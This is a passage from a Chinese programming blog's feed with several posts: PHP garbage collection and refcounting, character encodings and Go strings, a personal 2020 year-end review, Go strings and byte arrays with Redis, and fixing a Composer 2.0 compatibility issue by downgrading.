plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arr &#x3D; [&#39;a&#39;&#x3D;&gt;&#39;hello&#39;, &#39;b&#39;&#x3D;&gt;&#39;php&#39;];</span><br><span class="line">xdebug_debug_zval(&#39;arr&#39;);</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">arr:</span><br><span class="line">(refcount&#x3D;2, is_ref&#x3D;0)</span><br><span class="line">array (size&#x3D;2)</span><br><span class="line">  &#39;a&#39; &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)string &#39;hello&#39; (length&#x3D;5)</span><br><span class="line">  &#39;b&#39; &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)string &#39;php&#39; (length&#x3D;3)</span><br></pre></td></tr></table></figure><h3 id="4-引用赋值"><a href="#4-引用赋值" class="headerlink" title="4. 引用赋值"></a>4. 引用赋值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str &#x3D; &quot;hello, php&quot;;</span><br><span class="line">$str_bak &#x3D; &amp;$str;</span><br><span class="line">xdebug_debug_zval(&#39;str&#39;);</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str:(refcount&#x3D;2, is_ref&#x3D;1)string &#39;hello, php&#39; (length&#x3D;10)</span><br></pre></td></tr></table></figure><p><code>is_ref = 1</code>表示被引用次数为 <code>1</code>。</p><h3 id="5-销毁变量"><a href="#5-销毁变量" class="headerlink" title="5. 销毁变量"></a>5. 销毁变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; &quot;new string&quot;;</span><br><span class="line">$c &#x3D; $b &#x3D; $a;</span><br><span class="line">xdebug_debug_zval( &#39;a&#39; );</span><br><span class="line">unset( $b, $c );</span><br><span class="line">xdebug_debug_zval( &#39;a&#39; );</span><br><span class="line">unset( $a);</span><br><span class="line">xdebug_debug_zval( &#39;a&#39; );</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a:(refcount&#x3D;3, is_ref&#x3D;0)string &#39;new string&#39; (length&#x3D;10)</span><br><span class="line">a:(refcount&#x3D;1, is_ref&#x3D;0)string &#39;new string&#39; (length&#x3D;10)</span><br><span class="line">a: no such symbol</span><br></pre></td></tr></table></figure><p>可以看到当销毁变量a之后，与之包含类型的值和变量容器就会从内存中删除。</p><h2 id="测试垃圾回收机制"><a href="#测试垃圾回收机制" class="headerlink" title="测试垃圾回收机制"></a>测试垃圾回收机制</h2><p>下面用一个比较经典的内存泄露例子来测试垃圾回收机制，通过创建一个对象，这个对象中的一个属性被设置为对象本身，在下一个循环（iteration）中，当脚本中的变量被重新赋值时，就会发生内存泄漏。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Foo</span><br><span class="line">&#123;</span><br><span class="line">    public $var &#x3D; &#39;3.1415962654&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for ( $i &#x3D; 0; $i &lt;&#x3D; 1000000; $i++ )</span><br><span class="line">&#123;</span><br><span class="line">    $a &#x3D; new Foo;</span><br><span class="line">    $a-&gt;self &#x3D; $a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo memory_get_peak_usage(), &quot;\n&quot;;</span><br></pre></td></tr></table></figure><p>以我本地的机器为例，分别在打开/关闭垃圾回收机制（通过配置 zend.enable_gc实现）的情况下运行脚本，并记录时间。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ time php -dzend.enable_gc&#x3D;0 -dmemory_limit&#x3D;-1 -n get_memory.php</span><br><span class="line">440776744</span><br><span class="line">php -dzend.enable_gc&#x3D;0 -dmemory_limit&#x3D;-1 -n   0.22s user 0.23s system 39% cpu 1.145 total</span><br><span class="line"></span><br><span class="line">$ time php -dzend.enable_gc&#x3D;1 -dmemory_limit&#x3D;-1 -n get_memory.php</span><br><span class="line">4839240</span><br><span class="line">php -dzend.enable_gc&#x3D;1 -dmemory_limit&#x3D;-1 -n   0.42s user 0.03s system 76% cpu 0.588 total</span><br></pre></td></tr></table></figure><p>这个测试并不能代表真实应用程序的情况，但是它的确显示了新的垃圾回收机制在内存占用方面的好处。而且在执行中出现更多的循环引用变量时，内存节省会更多。</p><h2 id="垃圾回收相关配置"><a href="#垃圾回收相关配置" class="headerlink" title="垃圾回收相关配置"></a>垃圾回收相关配置</h2><p>可以通过修改配置文件 <code>php.ini</code> 中的 <code>zend.enable_gc</code> 来打开或关闭 PHP 的垃圾回收机制。</p><blockquote><p>刚好借着PHP 的垃圾回收这个主题解释一个问题：PHP 是否可以常驻内存？</p></blockquote><p>答案是：传统的PHP 无法以常驻内存的方式运行。</p><p>这是因为PHP 是一种解释型脚本语言，这种运行机制使得每个PHP 页面解释执行完之后，所有资源都被回收掉了。</p><p>不过好在Swoole 的出现为PHP 弥补了这一缺陷（这里用缺陷这个词并不合适，毕竟每一种语言工具应该尽可能扬长避短）。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.iminho.me/wiki/blog-18.html" target="_blank" rel="noopener">PHP二十一问：PHP的垃圾回收机制</a></li><li><a href="https://www.php.net/manual/zh/features.gc.refcounting-basics.php" target="_blank" rel="noopener">引用计数基本知识解释垃圾回收机制</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;PHP 是一门托管型语言，在PHP 编程时，程序员不需要手动处理内存资源的分配和释放，这就意味着 PHP 本身实现了垃圾回收机制（Garbage Collection）。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>字符串与编码</title>
    <link href="https://www.0x2beace.com/string-and-encoding/"/>
    <id>https://www.0x2beace.com/string-and-encoding/</id>
    <published>2021-01-03T15:20:47.000Z</published>
    <updated>2021-01-04T00:04:03.300Z</updated>
    
    <content type="html"><![CDATA[<p>因为计算机只能处理数字，如果需要处理文本，就需要先将文本转换为数字才能处理。最早的计算机在设计时采用<strong>8个比特（bit）作为一个字节（byte）</strong>，所以，一个字节能表示的最大的整数就是255（二进制 11111111=十进制255 ）。</p><a id="more"></a><p>由于计算机是美国人发明的，因此，最早只有127个字符被编码到计算机里，也就是大小写英文字母、数字和一些符号，这个编码表被称为ASCII编码。</p><p>但是要处理中文显然一个字节是不够的，至少需要两个字节，而且还不能和ASCII编码冲突，所以，中国制定了<code>GB2312</code>编码，用来把中文编进去。</p><p>可以想到的是，全世界有上百种语言，各国有各国的标准，就会不可避免地出现冲突，结果就是编码方式和解码方式不同，就会导致乱码。</p><p>因此，Unicode字符集应运而生。Unicode把所有语言都统一到一套编码里，这样就不会再有乱码问题了。</p><p>不过新的问题因此又出现了：如果统一成 Unicode 编码，乱码问题虽然是从此消失了，但是，如果你写的文本基本上全部是英文的话，用Unicode编码比ASCII编码需要多一倍的存储空间，在存储和传输上就十分不划算。</p><p>所以，本着节约的精神，又出现了把Unicode编码转化为“可变长编码”的UTF-8编码。UTF-8编码把一个Unicode字符根据不同的数字大小编码成1-6个字节，常用的英文字母被编码成1个字节，汉字通常是3个字节，只有很生僻的字符才会被编码成4-6个字节。</p><p>ASCII、Unicode和UTF-8 三者的关系是：</p><ol><li><strong>Unicode 是一种包含所有语言的字符集编码（替代ASCII编码）</strong></li><li><strong>UTF-8 是 Unicode 的实现方式之一</strong></li></ol><h3 id="字符编码在计算机中的工作方式"><a href="#字符编码在计算机中的工作方式" class="headerlink" title="字符编码在计算机中的工作方式"></a>字符编码在计算机中的工作方式</h3><p>在计算机内存中，统一使用Unicode编码，当需要保存到硬盘或者需要传输的时候，就转换为UTF-8编码。</p><p>用记事本编辑的时候，从文件读取的UTF-8字符被转换为Unicode字符到内存里，编辑完成后，保存的时候再把Unicode转换为UTF-8保存到文件：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210103161913.png" alt=""></p><p>浏览网页的时候，服务器会把动态生成的Unicode内容转换为UTF-8再传输到浏览器：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210103161935.png" alt=""></p><p>所以你看到很多网页的源码上会有类似<code>&lt;meta charset=&quot;UTF-8&quot; /&gt;</code>的信息，表示该网页正是用的UTF-8编码。</p><h3 id="Go-语言的字符串"><a href="#Go-语言的字符串" class="headerlink" title="Go 语言的字符串"></a>Go 语言的字符串</h3><p>Go 语言的字符串与其他编程语言的差异：</p><ol><li>string 是数据类型，不是引用或者指针类型（其零值不是空，是一个空字符串）</li><li>string 是只读的 byte slice，<code>len</code>函数获取的是它所包含的 <code>byte</code>数</li><li>string 的 byte 数组可以存放任何数据（二进制）</li></ol><p>通过一个实际例子来理解Go 的string、Unicode、UTF8：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import &quot;testing&quot;</span><br><span class="line"></span><br><span class="line">func TestString(t *testing.T)  &#123;</span><br><span class="line">var s3 &#x3D; &quot;中&quot;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; rune 这个数据类型可以取出字符串中的 Unicode 编码</span><br><span class="line">r :&#x3D; []rune(s3)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; byte 这个数据类型可以取出字符串的 UTF8 存储</span><br><span class="line">b :&#x3D; []byte(s3)</span><br><span class="line"></span><br><span class="line">t.Log(b)&#x2F;&#x2F; [228 184 173]</span><br><span class="line">t.Logf(&quot;中 的Unicode 编码：%x&quot;, r[0])</span><br><span class="line">t.Logf(&quot;中 的UTF8 存储：%X&quot;, s3)&#x2F;&#x2F; [0xE4, 0xB8, 0xAD]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>字符 <code>中</code> 字在 Unicode 中的编码是<code>0x4E2D</code>，它的物理存储形式依赖于 UTF8规则，它在内存被存储为了<code>E4B8AD</code>，放在 string 对应的 byte切片中，分别对应三个 byte：<code>[0xE4, 0xB8, 0xAD]</code>。</p><h3 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h3><blockquote><p>在我们的日常生活中用到的是十进制，计算机用的是二进制，那么为什么还会出现十六进制呢？</p></blockquote><p>这是因为使用二进制表示数据太长了，可读性十分差，正好十六是二的四次方，所以一位十六进制可以表示四位二进制。</p><h3 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h3><ul><li><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017075323632896" target="_blank" rel="noopener">字符串和编码——廖雪峰的官方网站</a></li><li><a href="http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html" target="_blank" rel="noopener">字符编码笔记：ASCII，Unicode 和 UTF-8</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;因为计算机只能处理数字，如果需要处理文本，就需要先将文本转换为数字才能处理。最早的计算机在设计时采用&lt;strong&gt;8个比特（bit）作为一个字节（byte）&lt;/strong&gt;，所以，一个字节能表示的最大的整数就是255（二进制 11111111=十进制255 ）。&lt;/p&gt;</summary>
    
    
    
    <category term="Golang" scheme="https://www.0x2beace.com/categories/Golang/"/>
    
    
    <category term="Golang" scheme="https://www.0x2beace.com/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>二零二零年终总结</title>
    <link href="https://www.0x2beace.com/2020-year-end-summary/"/>
    <id>https://www.0x2beace.com/2020-year-end-summary/</id>
    <published>2020-12-31T16:17:16.000Z</published>
    <updated>2021-03-02T14:22:00.544Z</updated>
    
    <content type="html"><![CDATA[<p>回顾整个二零二零年于我而言最大的收获大概是：找到了方向，知道自己该做什么了。</p><a id="more"></a><p>在此前，我一直处于“不确定”状态，不确定是否要选择这条路，不确定是否足够热爱，不确定是否能坚持下去。</p><p>而此刻，我很清晰地知道自己该做些什么，想要些什么。</p><p>这篇博客主要从生活、工作、学习、思考、分享以及未来这几个方面简单总结下过去的一年。</p><h2 id="关于生活"><a href="#关于生活" class="headerlink" title="关于生活"></a>关于生活</h2><p>这部分放在这里其实有些多余，即便如此，我还是想表达出来，<del>也许会有共鸣者呢</del>。</p><p>生活中的我，日常很简单。绝大部分时间都是宅在家里，不喜欢外出或者说不擅长社交。以前很少会觉得这样的日子是否会太孤独了。</p><p>不知为何，今年这种感觉尤其强烈。</p><p>生活在这个时代的我们似乎都太孤独了，无论是什么社会阶层、什么职业背景、什么性别状态，人就是孤独的。</p><p>渴望交流，却找不到合适的人; <del>渴望被爱，却害怕被伤害;</del></p><p>不久前看过一部电影《秒数五厘米》，里面有一句话给我的印象特别深刻——即使通了一千条短信，我们的心也只能拉近一厘米而已。</p><p>结合自己前些日子的一段经历，确实是这样，若只是排解寂寞，谁都可以取代。</p><h2 id="关于工作"><a href="#关于工作" class="headerlink" title="关于工作"></a>关于工作</h2><p>一谈到干我们这一行的，很多人可能第一反应可能就是加班，我并不反对加班，只是我们在加班时，应该思考一下为什么加班？</p><ul><li>是因为效率太低，本该工作时间内完成的事情，没有完成？</li><li>是因为事情太多？</li><li>还是只是因为老板没有走？</li></ul><p>当我在谈论加班时，我谈些什么——不加没有意义的班。</p><h2 id="关于学习"><a href="#关于学习" class="headerlink" title="关于学习"></a>关于学习</h2><p>前段时间工作上出了一点事故——因为实体机没有设置防火墙导致被病毒入侵。</p><p>防火墙在我的印象中属于那种底层比较高深，晦涩难懂的东西，再加上基础知识的匮乏让我对防火墙频频感到恐惧。</p><p>如果对整体没有清晰的认识，只是盲目的网上搜查着别人写好的规则，运气好，可能能解决;<br>运气不好，可能还会导致服务器连接不上，别问我是怎么知道的…</p><p>而当需要面临比较复杂的定制化需求时，就更寸步难行了。</p><p>关于学习，这也是我一直想提醒自己的：<strong>务实基础，不要做“知识的搬运工”</strong>。</p><div align="center"><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/photo_2020-09-19%2018.20.35.jpeg" width="500"><br><sup>附一张讽刺当代的开发者的图</sup></div><p>不知何时，技术圈越来越喜欢贩卖焦虑了，每天醒来，面对大多都是这样的信息：</p><ul><li>“关于 XXX 的那些你不知道的真相”</li><li>“吐血整理，万字长文搞定 XXX”</li><li>“全网最硬核解读 XXX 底层原理”</li><li>“搞定这道 XXX 面试题，大厂随便进”</li><li>“字节内部疯传的一份 XXX 失传资料”</li><li>…</li></ul><p>从侧面也反映出国内的软件开发者承担的职业发展压力。</p><p>和大部分人一样，我也时常会焦虑，但还是要对未来持乐观态度，毕竟高级人才无论何时都是紧缺的。</p><p>事实上，我们不得不承认一个残酷的事实——大部分从业者只是在做重复性、创新价值低的工作。这些工作在一定程度上会逐渐被取代，这不意味着这些工作会被取缔，而是更高效的完成。</p><p>通俗一点讲就是一个高手可以取代N 个低手。</p><h2 id="关于思考"><a href="#关于思考" class="headerlink" title="关于思考"></a>关于思考</h2><p>我一直觉得有三件事情在我们这个时代中极为重要，他们分别是：</p><ol><li>编程</li><li>写作</li><li>英语</li></ol><h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><p>毋庸置疑，技术改变世界。</p><h3 id="写作"><a href="#写作" class="headerlink" title="写作"></a>写作</h3><p>在这个信息爆炸的时代，为知识付费的行为已经逐渐被接受，付费渠道成为有效的过滤手段，也促使原创作者输出更高质量的内容。</p><p>当然写作能力并不是一蹴而就，需要不断积累、实践、总结。</p><p>从出来后，我就有一直刻意保持这个习惯，大多数时候我会选择用文字来记录（博客也是一种记录方式），可能是觉得用文字记录的方式更真实一些，回头看到那些写满地文字，会发现不知不觉中已经陪伴我走了这么远。</p><h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><p>第三件事是我一直想要做，却还没有开始做（或者说没有坚持下去）。因为我一直认同一个观点：如果你英文不行，你基本与高手无缘了。</p><h3 id="如何成功做好一件事"><a href="#如何成功做好一件事" class="headerlink" title="如何成功做好一件事"></a>如何成功做好一件事</h3><p>如何成功做好一件事情？给我最大的感触就是，一定要具备以下两个因素：</p><ol><li>兴趣</li><li>成就感</li></ol><p>前者是开始的动力，后者是坚持下去的动力。</p><h2 id="关于分享"><a href="#关于分享" class="headerlink" title="关于分享"></a>关于分享</h2><p>为什么要写博客？</p><p>一方面，阶段性地对一些知识进行总结，方便自己日后需要时查找。</p><p>另一方面，我一直觉得知识不是篮子里面的鸡蛋，不会因为你分享给他人而减少，相反，你会收获到更多其他的东西，这也是我开始写博客的初衷。</p><p>时至今日，小破站成立了六个月，刚好一百八十天。累计发文一百余篇，虽然不是每篇都是千字长文，但每篇都是经过思考一个字一个字码出来的。</p><p>可无奈整体访客却少得可怜，这不禁让我陷入沉思，是否有必要把部分精华内容发布到微信公众号上。</p><p>目前还没有公众号，创建一个公众号并不难，难的是如何取一个不错地名字及维护好这个公众号。</p><p>而对于取名字这件事情，我向来并不擅长，所以这件事情就一直被闲置了。</p><h2 id="关于未来"><a href="#关于未来" class="headerlink" title="关于未来"></a>关于未来</h2><p>马上就要迎来新的一年了，免不了制定计划为新的一年做好准备。我这个人似乎从来都不缺计划，缺的是完成计划的执行力。相比于计划本身，似乎更应该关注完成计划的效率。</p><ul><li><input disabled="" type="checkbox"> 创建一个公众号？</li><li><input disabled="" type="checkbox"> 掌握 Go 语言</li><li><input disabled="" type="checkbox"> 务实计算机组成原理、操作系统原理、数据结构及计算机网络基础</li><li><input disabled="" type="checkbox"> 至少完成一百道 LeetCode 题目</li><li><input disabled="" type="checkbox"> 继续坚持跑步</li></ul><p>最后的最后用一段我比较喜欢的话，作为结束语：</p><blockquote><p>你可以抱怨，你可以哭泣，可你要知道明天太阳还是一样会升起，你只需要知道这个世界对谁都是一样的，你过得很累，其他人也一样没有顺风顺水。累了，就去被窝里冥想发呆; 渴了，就穿上毛绒兔的拖鞋哒哒下楼，买一杯冰镇柠檬茶，或者去路边煮一碗热气腾腾的牛肉面;闻一闻路边的野菊，看几部幽默或感人的电影;哪怕这一切只是为了取悦那个心情不好的自己。最后，多多努力，努力做一个可爱的人，一个闪闪发光的人，不讨好，不将就，对过往的苦难情深意重，但绝不回头，你只需要一路向前，披荆斩棘就好，别忘了，带着笑：）</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;回顾整个二零二零年于我而言最大的收获大概是：找到了方向，知道自己该做什么了。&lt;/p&gt;</summary>
    
    
    
    <category term="年终总结" scheme="https://www.0x2beace.com/categories/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="年终总结" scheme="https://www.0x2beace.com/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>理解 Go 语言中的字符串和字节数组</title>
    <link href="https://www.0x2beace.com/understand-strings-and-byte-arrays-in-Go/"/>
    <id>https://www.0x2beace.com/understand-strings-and-byte-arrays-in-Go/</id>
    <published>2020-12-30T15:57:13.000Z</published>
    <updated>2021-01-04T10:47:06.213Z</updated>
    
    <content type="html"><![CDATA[<p>最近在学习Go 语言时，遇到一个很有意思的问题，记录一下。</p><a id="more"></a><p>第一次使用<code>redisgo</code> 时，有点懵，怎么取出来的数据跟我存的完全不一样？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">&quot;fmt&quot;</span><br><span class="line">&quot;github.com&#x2F;gomodule&#x2F;redigo&#x2F;redis&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">  conn, _ :&#x3D; redis.Dial(&quot;tcp&quot;, &quot;127.0.0.1:6379&quot;)</span><br><span class="line">  defer conn.Close()</span><br><span class="line">  </span><br><span class="line">  conn.Send(&quot;SET&quot;, &quot;hello&quot;, &quot;hello&quot;)</span><br><span class="line">  conn.Send(&quot;GET&quot;, &quot;hello&quot;)</span><br><span class="line">  conn.Flush()</span><br><span class="line">  </span><br><span class="line">  v, _ :&#x3D; conn.Receive()</span><br><span class="line">  fmt.Println(v)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[104 101 108 108 111]</span><br></pre></td></tr></table></figure><p>当看到这个打印结果时，咦～我明明存进去的是一个 <code>hello</code>，怎么取出来却成了一个数组？</p><p>要回答这个问题，就得了解Go 语言中的字符串这个数据结构了。</p><h3 id="认识字符串"><a href="#认识字符串" class="headerlink" title="认识字符串"></a>认识字符串</h3><p>字符串是Go 语言中最常用的基础数据类型之一，虽然字符串往往是被看作是一个整体，但实际上字符串是一块连续的内存空间，也可以理解成是一个由字符组成的数组。</p><p>字符串虽然在 Go 语言中是基本类型 string（<code>hello</code>），但是它其实就是字符组成的数组（<code>[104 101 108 108 111]</code>）。</p><p>作为数组来说，它会占用一片连续的内存空间，这片连续的内存空间就存储了一些<strong>字节</strong>，这些字节共同组成了字符串。</p><p><strong>Go 语言中的字符串是一个只读的字节数组切片</strong>。</p><p>尝试将数组切片转换成字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import &quot;fmt&quot;</span><br><span class="line"></span><br><span class="line">func main()  &#123;</span><br><span class="line">  &#x2F;&#x2F; 注意这里的数据类型是 uint8，而不是 int、uint</span><br><span class="line">sli :&#x3D; []uint8&#123;104, 101, 108, 108, 111&#125;</span><br><span class="line">fmt.Println(sli)</span><br><span class="line">fmt.Printf(&quot;%T \n&quot;, sli)</span><br><span class="line"></span><br><span class="line">fmt.Println(string(sli))       </span><br><span class="line">fmt.Printf(&quot;%T \n&quot;, string(sli))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[104 101 108 108 111]</span><br><span class="line">[]uint8 </span><br><span class="line">hello</span><br><span class="line">string</span><br></pre></td></tr></table></figure><p>来看看<code>hello</code>这个字符串在内存中的存储方式：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201230160415.png" alt=""></p><p>你可能会问：<code>0x68</code>、<code>0x65</code>、<code>0x6c</code>、<code>0x6c</code>、<code>0x6f</code>这些东西是什么？</p><p>他们是<code>hello</code> 这个字符串的切片数组的每一个字符的ASCII码所对应的十六进制：</p><ul><li><code>h</code> =&gt; 104 =&gt; <code>0x68</code></li><li><code>e</code> =&gt; 101 =&gt; <code>0x65</code></li><li><code>l</code> =&gt; 108 =&gt; <code>0x6c</code></li><li><code>l</code> =&gt; 108 =&gt; <code>0x6c</code></li><li><code>o</code> =&gt; 111 =&gt; <code>0x6f</code></li></ul><h3 id="声明字符串"><a href="#声明字符串" class="headerlink" title="声明字符串"></a>声明字符串</h3><p>在Go 语言中，有两种字面量方式可以声明一个字符串，一种是使用双引号，另一种则是使用反引号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str1 :&#x3D; &quot;this is a string&quot;</span><br><span class="line">str2 :&#x3D; &#96;this is another&#96;</span><br></pre></td></tr></table></figure><p>使用双引号声明的字符串其实和其他语言中的字符串声明没有太多区别，它只能用于简单、单行的字符串。</p><p>并且如果字符串内部出现双引号时需要使用 <code>\</code> 符号来避免编译器解析错误，而使用反引号则可以很好的摆脱这一限制。</p><p>在遇到需要写 JSON 或者其他数据格式的场景下非常方便，下面两个 JSON 字符串的写法都没问题，但显然第二种方式更简洁、自然、便于阅读。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str1 :&#x3D; &quot;&#123;\&quot;page\&quot;: 1, \&quot;fruits\&quot;: [\&quot;apple\&quot;, \&quot;pear\&quot;]&#125;&quot;</span><br><span class="line">str2 :&#x3D; &#96;&#123;&quot;page&quot;: 1, &quot;fruits&quot;: [&quot;apple&quot;, &quot;pear&quot;]&#125;&#96;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.infoq.cn/article/wj08lvwzu6tnkv4sidy6" target="_blank" rel="noopener">谈 Golang 中的字符串和字节数组</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近在学习Go 语言时，遇到一个很有意思的问题，记录一下。&lt;/p&gt;</summary>
    
    
    
    <category term="Golang" scheme="https://www.0x2beace.com/categories/Golang/"/>
    
    
    <category term="Golang" scheme="https://www.0x2beace.com/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>Composer 2.0 向下不兼容导致扩展安装出错</title>
    <link href="https://www.0x2beace.com/composer-2-0-backward-incompatibility-causes-extension-installation-error/"/>
    <id>https://www.0x2beace.com/composer-2-0-backward-incompatibility-causes-extension-installation-error/</id>
    <published>2020-12-17T12:40:38.000Z</published>
    <updated>2020-12-17T12:41:30.424Z</updated>
    
    <content type="html"><![CDATA[<p>今天在部署服务器环境时，遇到一个由Composer 版本向下不兼容而引发的问题，记录一下。</p><a id="more"></a><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>后台Api 应用是用<code>ThinkPHP6.0</code> 的多应用模式开发的，起初部署时，总是提示找不到控制器。</p><p>当时就比较郁闷，怎么会找不到控制器呢？这个异常通常只会在没有开启多应用模式时才会出现，可是我明明已经开启了多应用模式，也安装了相关扩展（Composer 2.0.x 执行 composer install 没有直接抛出异常）。</p><p>正当我百思不得其解时，不经意间看到了我目前所使用的 Composer 版本是 <code>2.0.x</code>。</p><p>回头对比了一下我本地的版本：<code>1.8</code>，Google 一下才发现Composer 2.0 系列是最近才发布的，于是马上就想到了是否是 Composer 向下不兼容导致。</p><p>好家伙，真的是兼容性导致的问题：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201217105443.png" alt=""></p><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><p>既然是版本过高导致的兼容性问题，那就好办了，直接降低版本即可。</p><p>Composer 降级非常简单，不用重新编译安装，直接使用以下命令即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer self-update 1.8.0</span><br></pre></td></tr></table></figure><p>如果你不知道有哪些版本可选择，可以查看官方的<a href="https://getcomposer.org/download/" target="_blank" rel="noopener">发布历史</a>。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.thinkphp.cn/1997806" target="_blank" rel="noopener">ThinkPHP V6.0.5版本发布——兼容Composer2.0</a></li><li><a href="https://www.kancloud.cn/thinkphp/composer" target="_blank" rel="noopener">Composer 中文文档</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天在部署服务器环境时，遇到一个由Composer 版本向下不兼容而引发的问题，记录一下。&lt;/p&gt;</summary>
    
    
    
